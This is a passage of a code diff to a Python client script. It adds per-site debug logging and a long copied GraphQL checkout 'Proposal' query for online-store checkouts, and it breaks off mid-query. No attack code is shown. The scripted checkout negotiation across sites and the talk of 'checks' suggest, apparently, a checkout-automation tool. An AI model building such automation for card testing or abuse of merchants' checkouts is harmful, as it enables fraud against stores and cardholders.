@@ -11,6 +11,23 @@ import time
 import logging
 logging.getLogger("aiohttp.client").setLevel(logging.ERROR)
 
+# ── Verbose diagnostics ───────────────────────────────────────────────────────
+# Every step that can silently kill a check now says WHY on the console.
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s | %(levelname)-5s | %(message)s",
+    datefmt="%H:%M:%S",
+)
+alog = logging.getLogger("api")
+
+
+def _dbg(site, msg):
+    try:
+        host = urlparse(site if str(site).startswith("http") else "https://" + str(site)).netloc
+    except Exception:
+        host = str(site)
+    alog.info(f"[{host}] {msg}")
+
 QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on 